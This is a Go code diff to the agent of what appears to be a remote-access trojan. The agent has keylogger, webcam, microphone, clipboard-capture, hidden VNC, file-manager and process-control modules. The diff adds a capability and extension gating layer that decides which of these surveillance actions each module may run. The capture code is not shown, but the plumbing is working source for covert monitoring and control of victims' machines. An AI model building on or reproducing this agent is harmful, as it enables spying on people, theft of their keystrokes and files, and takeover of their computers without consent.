@@ -2,6 +2,7 @@ package agent
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"log"
@@ -222,16 +223,16 @@ func newDefaultModuleManager() *moduleManager {
 	registry := newModuleManager()
 	registry.register(&appVncModule{})
 	registry.register(newRemoteDesktopModule(nil))
-	registry.register(&audioModule{})
-	registry.register(&keyloggerModule{})
-	registry.register(&webcamModule{})
-	registry.register(&clipboardModule{})
-	registry.register(&fileManagerModule{})
-	registry.register(&taskManagerModule{})
-	registry.register(&tcpConnectionsModule{})
-	registry.register(&clientChatModule{})
+	registry.register(newAudioModule())
+	registry.register(newKeyloggerModule())
+	registry.register(newWebcamModule())
+	registry.register(newClipboardModule())
+	registry.register(newFileManagerModule())
+	registry.register(newTaskManagerModule())
+	registry.register(newTCPConnectionsModule())
+	registry.register(newClientChatModule())
 	registry.register(&recoveryModule{})
-	registry.register(&systemInfoModule{})
+	registry.register(newSystemInfoModule())
 	return registry
 }
 
@@ -536,6 +537,144 @@ func sanitizeModuleCapabilities(caps []ModuleCapability) []ModuleCapability {
 		return nil
 	}
 	return sanitized
+}
+
+func buildCapabilitySet(base []string, extensions map[string]ModuleExtension) map[string]struct{} {
+	size := len(base)
+	for _, ext := range extensions {
+		size += len(ext.Capabilities)
+	}
+	capabilities := make(map[string]struct{}, size)
+	for _, id := range base {
+		trimmed := strings.TrimSpace(id)
+		if trimmed == "" {
+			continue
+		}
+		capabilities[strings.ToLower(trimmed)] = struct{}{}
+	}
+	for _, extension := range extensions {
+		for _, capability := range extension.Capabilities {
+			id := strings.TrimSpace(capability.ID)
+			if id == "" {
+				id = strings.TrimSpace(capability.Name)
+			}
+			if id == "" {
+				continue
+			}
+			capabilities[strings.ToLower(id)] = struct{}{}
+		}
+	}
+	return capabilities
+}
+
+type moduleExtensionState struct {
+	mu           sync.RWMutex
+	base         []string
+	extensions   map[string]ModuleExtension
+	capabilities map[string]struct{}
+}
+
+func newModuleExtensionState(base []string) *moduleExtensionState {
+	state := &moduleExtensionState{base: append([]string(nil), base...)}
+	state.capabilities = buildCapabilitySet(state.base, nil)
+	return state
+}
+
+func (s *moduleExtensionState) register(extension ModuleExtension) error {
+	if s == nil {
+		return errors.New("module extension state not initialized")
+	}
+	source := strings.TrimSpace(extension.Source)
+	if source == "" {
+		return errors.New("extension source required")
+	}
+
+	sanitized := copyModuleExtension(extension)
+	sanitized.Source = source
+
+	s.mu.Lock()
+	if s.extensions == nil {
+		s.extensions = make(map[string]ModuleExtension)
+	}
+	s.extensions[source] = sanitized
+	s.capabilities = buildCapabilitySet(s.base, s.extensions)
+	s.mu.Unlock()
+	return nil
+}
+
+func (s *moduleExtensionState) unregister(source string) error {
+	if s == nil {
+		return nil
+	}
+	trimmed := strings.TrimSpace(source)
+
+	s.mu.Lock()
+	if len(s.extensions) == 0 {
+		if s.capabilities == nil {
+			s.capabilities = buildCapabilitySet(s.base, nil)
+		}
+		s.mu.Unlock()
+		return nil
+	}
+	if trimmed == "" {
+		s.extensions = nil
+	} else {
+		delete(s.extensions, trimmed)
+		if len(s.extensions) == 0 {
+			s.extensions = nil
+		}
+	}
+	s.capabilities = buildCapabilitySet(s.base, s.extensions)
+	s.mu.Unlock()
+	return nil
+}
+
+func (s *moduleExtensionState) hasCapability(id string) bool {
+	if s == nil {
+		return false
+	}
+	trimmed := strings.TrimSpace(strings.ToLower(id))
+	if trimmed == "" {
+		return true
+	}
+
+	s.mu.RLock()
+	capabilities := s.capabilities
+	s.mu.RUnlock()
+	if capabilities == nil {
+		s.mu.Lock()
+		if s.capabilities == nil {
+			s.capabilities = buildCapabilitySet(s.base, s.extensions)
+		}
+		capabilities = s.capabilities
+		s.mu.Unlock()
+	}
+	_, ok := capabilities[trimmed]
+	return ok
+}
+
+func (s *moduleExtensionState) hasAnyCapability(ids ...string) bool {
+	for _, id := range ids {
+		if s.hasCapability(id) {
+			return true
+		}
+	}
+	return false
+}
+
+func capabilityUnavailableResult(cmd protocol.Command, moduleID string, capabilities ...string) protocol.CommandResult {
+	detail := "required capability"
+	if len(capabilities) == 1 {
+		detail = capabilities[0]
+	} else if len(capabilities) > 1 {
+		detail = strings.Join(capabilities, ", ")
+	}
+	return protocol.CommandResult{
+		CommandID:   cmd.ID,
+		Success:     false,
+		Error:       fmt.Sprintf("%s capability %s requires a registered extension", moduleID, detail),
+		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+	}
 }
 
 func (r *moduleManager) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
@@ -1090,16 +1229,44 @@ func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg 
 	return engine, version, nil
 }
 
+var (
+	audioModuleBaseCapabilities          = []string{"audio.capture", "audio.inject"}
+	keyloggerModuleBaseCapabilities      = []string{"keylogger.stream", "keylogger.batch"}
+	webcamModuleBaseCapabilities         = []string{"webcam.enumerate", "webcam.stream"}
+	clipboardModuleBaseCapabilities      = []string{"clipboard.capture", "clipboard.push"}
+	fileManagerModuleBaseCapabilities    = []string{"file-manager.explore", "file-manager.modify"}
+	taskManagerModuleBaseCapabilities    = []string{"task-manager.list", "task-manager.control"}
+	tcpConnectionsModuleBaseCapabilities = []string{"tcp-connections.enumerate", "tcp-connections.control"}
+	clientChatModuleBaseCapabilities     = []string{"client-chat.persistent", "client-chat.alias"}
+	systemInfoModuleBaseCapabilities     = []string{"system-info.snapshot", "system-info.telemetry"}
+)
+
+func newAudioModule() *audioModule                   { return &audioModule{} }
+func newKeyloggerModule() *keyloggerModule           { return &keyloggerModule{} }
+func newWebcamModule() *webcamModule                 { return &webcamModule{} }
+func newClipboardModule() *clipboardModule           { return &clipboardModule{} }
+func newFileManagerModule() *fileManagerModule       { return &fileManagerModule{} }
+func newTaskManagerModule() *taskManagerModule       { return &taskManagerModule{} }
+func newTCPConnectionsModule() *tcpConnectionsModule { return &tcpConnectionsModule{} }
+func newClientChatModule() *clientChatModule         { return &clientChatModule{} }
+func newSystemInfoModule() *systemInfoModule         { return &systemInfoModule{} }
+
 type audioModule struct {
-	bridge *audioctrl.AudioBridge
+	bridge     *audioctrl.AudioBridge
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 type keyloggerModule struct {
-	manager *keyloggerctrl.Manager
+	manager    *keyloggerctrl.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 type webcamModule struct {
-	manager *webcamctrl.Manager
+	manager    *webcamctrl.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *webcamModule) Metadata() ModuleMetadata {
@@ -1135,6 +1302,21 @@ func (m *webcamModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *webcamModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(webcamModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *webcamModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *webcamModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *webcamModule) configure(runtime Config) error {
 	cfg := webcamctrl.Config{
 		AgentID:   runtime.AgentID,
@@ -1160,6 +1342,23 @@ func (m *webcamModule) Handle(ctx context.Context, cmd protocol.Command) error {
 			Error:       "webcam subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
+	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload protocol.WebcamCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			switch action {
+			case "", "enumerate", "inventory":
+				if !state.hasCapability("webcam.enumerate") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "webcam.enumerate"))
+				}
+			case "start", "stop", "update":
+				if !state.hasCapability("webcam.stream") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "webcam.stream"))
+				}
+			}
+		}
 	}
 	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
@@ -1201,6 +1400,21 @@ func (m *audioModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *audioModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(audioModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *audioModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *audioModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *audioModule) configure(runtime Config) error {
 	cfg := audioctrl.Config{
 		AgentID:   runtime.AgentID,
@@ -1226,6 +1440,35 @@ func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) error {
 			Error:       "audio subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
+	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload audioctrl.AudioControlCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.ToLower(strings.TrimSpace(payload.Action))
+			switch action {
+			case "", "enumerate", "inventory":
+				if !state.hasCapability("audio.capture") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "audio.capture"))
+				}
+			case "start":
+				direction := payload.Direction
+				if direction == "" {
+					direction = audioctrl.AudioDirectionInput
+				}
+				required := "audio.capture"
+				if direction == audioctrl.AudioDirectionOutput {
+					required = "audio.inject"
+				}
+				if !state.hasCapability(required) {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), required))
+				}
+			case "stop":
+				if !state.hasAnyCapability("audio.capture", "audio.inject") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "audio.capture", "audio.inject"))
+				}
+			}
+		}
 	}
 	return WrapCommandResult(m.bridge.HandleCommand(ctx, cmd))
 }
@@ -1270,6 +1513,21 @@ func (m *keyloggerModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *keyloggerModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(keyloggerModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *keyloggerModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *keyloggerModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *keyloggerModule) configure(runtime Config) error {
 	cfg := keyloggerctrl.Config{
 		AgentID:   runtime.AgentID,
@@ -1296,6 +1554,41 @@ func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) erro
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload keyloggerctrl.CommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			if action == "" {
+				switch strings.ToLower(strings.TrimSpace(cmd.Name)) {
+				case "keylogger.start":
+					action = "start"
+				case "keylogger.stop":
+					action = "stop"
+				}
+			}
+			switch action {
+			case "start":
+				mode := payload.Mode
+				if payload.Config != nil && payload.Config.Mode != "" {
+					mode = payload.Config.Mode
+				}
+				if mode == keyloggerctrl.ModeOffline {
+					if !state.hasCapability("keylogger.batch") {
+						return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "keylogger.batch"))
+					}
+				} else {
+					if !state.hasCapability("keylogger.stream") {
+						return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "keylogger.stream"))
+					}
+				}
+			case "stop":
+				if !state.hasAnyCapability("keylogger.stream", "keylogger.batch") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "keylogger.stream", "keylogger.batch"))
+				}
+			}
+		}
+	}
 	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
@@ -1307,7 +1600,9 @@ func (m *keyloggerModule) Shutdown(context.Context) error {
 }
 
 type clipboardModule struct {
-	manager *clipboard.Manager
+	manager    *clipboard.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *clipboardModule) Metadata() ModuleMetadata {
@@ -1343,6 +1638,21 @@ func (m *clipboardModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *clipboardModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(clipboardModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *clipboardModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *clipboardModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *clipboardModule) configure(runtime Config) error {
 	cfg := clipboard.Config{
 		AgentID:   runtime.AgentID,
@@ -1369,6 +1679,27 @@ func (m *clipboardModule) Handle(ctx context.Context, cmd protocol.Command) erro
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload clipboard.ClipboardCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			switch action {
+			case "get", "":
+				if !state.hasCapability("clipboard.capture") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.capture"))
+				}
+			case "set":
+				if !state.hasCapability("clipboard.push") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.push"))
+				}
+			case "sync-triggers":
+				if !state.hasCapability("clipboard.capture") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "clipboard.capture"))
+				}
+			}
+		}
+	}
 	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
@@ -1380,7 +1711,9 @@ func (m *clipboardModule) Shutdown(context.Context) error {
 }
 
 type fileManagerModule struct {
-	manager *filemanager.Manager
+	manager    *filemanager.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *fileManagerModule) Metadata() ModuleMetadata {
@@ -1416,6 +1749,21 @@ func (m *fileManagerModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *fileManagerModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(fileManagerModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *fileManagerModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *fileManagerModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *fileManagerModule) configure(runtime Config) error {
 	cfg := filemanager.Config{
 		AgentID:   runtime.AgentID,
@@ -1442,6 +1790,23 @@ func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) er
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload filemanager.FileManagerCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			switch action {
+			case "list-directory", "read-file":
+				if !state.hasCapability("file-manager.explore") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "file-manager.explore"))
+				}
+			case "create-entry", "rename-entry", "move-entry", "delete-entry", "update-file":
+				if !state.hasCapability("file-manager.modify") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "file-manager.modify"))
+				}
+			}
+		}
+	}
 	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
@@ -1451,7 +1816,9 @@ func (m *fileManagerModule) Shutdown(context.Context) error {
 }
 
 type taskManagerModule struct {
-	manager *taskmanager.Manager
+	manager    *taskmanager.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *taskManagerModule) Metadata() ModuleMetadata {
@@ -1487,6 +1854,21 @@ func (m *taskManagerModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *taskManagerModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(taskManagerModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *taskManagerModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *taskManagerModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *taskManagerModule) configure(runtime Config) error {
 	if m.manager == nil {
 		m.manager = taskmanager.NewManager(runtime.Logger)
@@ -1505,6 +1887,22 @@ func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) er
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload taskmanager.TaskManagerCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			switch payload.Request.Operation {
+			case taskmanager.OperationList, taskmanager.OperationDetail:
+				if !state.hasCapability("task-manager.list") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.list"))
+				}
+			case taskmanager.OperationStart, taskmanager.OperationAction:
+				if !state.hasCapability("task-manager.control") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.control"))
+				}
+			}
+		}
+	}
 	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
@@ -1514,7 +1912,9 @@ func (m *taskManagerModule) Shutdown(context.Context) error {
 }
 
 type tcpConnectionsModule struct {
-	manager *tcpconnections.Manager
+	manager    *tcpconnections.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
@@ -1550,6 +1950,21 @@ func (m *tcpConnectionsModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *tcpConnectionsModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(tcpConnectionsModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *tcpConnectionsModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *tcpConnectionsModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *tcpConnectionsModule) configure(runtime Config) error {
 	cfg := tcpconnections.Config{
 		AgentID:   runtime.AgentID,
@@ -1575,6 +1990,22 @@ func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command)
 			Error:       "tcp connections subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
+	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload tcpconnections.TcpConnectionsCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			if action == "enumerate" || action == "" {
+				if !state.hasCapability("tcp-connections.enumerate") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "tcp-connections.enumerate"))
+				}
+			} else {
+				if !state.hasCapability("tcp-connections.control") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "tcp-connections.control"))
+				}
+			}
+		}
 	}
 	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
@@ -1659,6 +2090,8 @@ func (m *recoveryModule) Shutdown(context.Context) error {
 
 type clientChatModule struct {
 	supervisor *clientchat.Supervisor
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *clientChatModule) Metadata() ModuleMetadata {
@@ -1694,6 +2127,21 @@ func (m *clientChatModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *clientChatModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(clientChatModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *clientChatModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *clientChatModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *clientChatModule) configure(runtime Config) error {
 	cfg := clientchat.Config{
 		AgentID:   runtime.AgentID,
@@ -1720,6 +2168,53 @@ func (m *clientChatModule) Handle(ctx context.Context, cmd protocol.Command) err
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+	state := m.extensionState()
+	if len(cmd.Payload) > 0 {
+		var payload protocol.ClientChatCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			requireAlias := func() bool {
+				if payload.Aliases != nil {
+					if strings.TrimSpace(payload.Aliases.Operator) != "" || strings.TrimSpace(payload.Aliases.Client) != "" {
+						return true
+					}
+				}
+				if payload.Message != nil {
+					if strings.TrimSpace(payload.Message.Alias) != "" {
+						return true
+					}
+				}
+				return false
+			}
+			switch action {
+			case "", "start":
+				if !state.hasCapability("client-chat.persistent") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
+				}
+				if requireAlias() && !state.hasCapability("client-chat.alias") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
+				}
+			case "configure":
+				if payload.Features != nil && !state.hasCapability("client-chat.persistent") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
+				}
+				if requireAlias() && !state.hasCapability("client-chat.alias") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
+				}
+			case "send-message":
+				if !state.hasCapability("client-chat.persistent") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
+				}
+				if requireAlias() && !state.hasCapability("client-chat.alias") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.alias"))
+				}
+			case "stop":
+				if !state.hasCapability("client-chat.persistent") {
+					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "client-chat.persistent"))
+				}
+			}
+		}
+	}
 	return WrapCommandResult(m.supervisor.HandleCommand(ctx, cmd))
 }
 
@@ -1731,7 +2226,9 @@ func (m *clientChatModule) Shutdown(ctx context.Context) error {
 }
 
 type systemInfoModule struct {
-	collector *systeminfo.Collector
+	collector  *systeminfo.Collector
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *systemInfoModule) Metadata() ModuleMetadata {
@@ -1767,6 +2264,21 @@ func (m *systemInfoModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
+func (m *systemInfoModule) extensionState() *moduleExtensionState {
+	m.extOnce.Do(func() {
+		m.extensions = newModuleExtensionState(systemInfoModuleBaseCapabilities)
+	})
+	return m.extensions
+}
+
+func (m *systemInfoModule) RegisterExtension(extension ModuleExtension) error {
+	return m.extensionState().register(extension)
+}
+
+func (m *systemInfoModule) UnregisterExtension(source string) error {
+	return m.extensionState().unregister(source)
+}
+
 func (m *systemInfoModule) configure(runtime Config) error {
 	if runtime.Provider == nil {
 		return fmt.Errorf("missing agent provider")
@@ -1783,6 +2295,18 @@ func (m *systemInfoModule) Handle(ctx context.Context, cmd protocol.Command) err
 			Error:       "system information subsystem not initialized",
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
+	}
+	state := m.extensionState()
+	if !state.hasCapability("system-info.snapshot") {
+		return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "system-info.snapshot"))
+	}
+	if len(cmd.Payload) > 0 {
+		var payload systeminfo.SystemInfoCommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			if payload.Refresh && !state.hasCapability("system-info.telemetry") {
+				return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "system-info.telemetry"))
+			}
+		}
 	}
 	return WrapCommandResult(m.collector.HandleCommand(ctx, cmd))
 }
